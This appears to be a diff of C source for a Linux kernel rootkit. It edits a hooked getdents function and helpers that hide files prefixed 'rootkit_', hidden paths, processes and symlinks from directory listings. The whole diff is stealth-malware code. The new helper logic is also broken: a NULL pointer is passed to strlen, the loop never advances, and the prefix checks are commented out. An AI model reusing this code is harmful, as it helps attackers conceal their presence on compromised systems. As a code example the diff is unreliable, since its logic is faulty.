@@ -23,27 +23,26 @@ static spinlock_t getdents_lock;
 static unsigned long getdents_lock_flags;
 
 
-/* 
- * Gets just the file name of a full path. Can be NULL!
- */
 char *
-get_fname_from_path(char *path)
+get_next_level (char *path)
 {
-	char *ptr, *name;
+	char *ptr;
 	char delimiter = '/';
 	
 	if(path == NULL) {
 		return NULL;
 	}
 	
-	ptr = strrchr(path, delimiter);
+	ptr = strchr(path, delimiter);
 	if(ptr != NULL) {
-		return path;
+		return NULL;
 	} else {
-		name = ptr + 1;
+		if(strlen(ptr) > 1) {
+			return ptr + 1;
+		} else {
+			return NULL;
+		}
 	}
-	
-	return name;
 }
 
 /*
@@ -69,26 +68,28 @@ int
 check_hide_fprefix(char *path)
 {
 	char *d_name;
-
+	
 	if(path == NULL) {
 		return 0;
 	}
-	
-	d_name = get_fname_from_path(path);
 
-	if(d_name == NULL) {
-		return 0;
-	}
-	
-	// TODO: implement dynamic prefixes
-	if(strstr(d_name, "rootkit_") == d_name) 
-	{
-		return 1;
-	}
-	else if(strstr(d_name, ".rootkit_") == d_name)
-	{
-		return 1;
-	}
+	do {	
+		d_name = get_next_level(path);
+		
+		if(d_name == NULL) {
+			break;
+		}
+
+		// TODO: implement dynamic prefixes
+		if(strstr(d_name, "rootkit_") == d_name) 
+		{
+			return 1;
+		}
+		else if(strstr(d_name, ".rootkit_") == d_name)
+		{
+			return 1;
+		}
+	} while (d_name != NULL);
 
 	return 0;
 }
@@ -147,16 +148,16 @@ check_hide_symlink(char *path)
 		if(lpath_len < 0) {
 			break;
 		}
-		ROOTKIT_DEBUG("Current lpath: '%s'\n", lpath);
+		// ROOTKIT_DEBUG("Current lpath: '%s'\n", lpath);
 		/* check if the current link is pointing to a hidden path */
 		if(check_hide_fpath(lpath)) {
 			return 1;
 		}
 
 		/* check if the current link is pointing to a file with a hiding prefix */
-		if(check_hide_fprefix(lpath)) {
-			return 1;
-		}
+		//if(check_hide_fprefix(lpath)) {
+		//	return 1;
+		//}
 
 		/* prepare everything for the next loop */
 		memset(curpath, 0, 1024);
@@ -198,7 +199,7 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
 
 		if(check_hide_fpath(path)
-				|| check_hide_fprefix(path)
+		//		|| check_hide_fprefix(path)
 				|| check_hide_process(fd, dirp->d_name)
 				|| check_hide_symlink(path))
 		{	
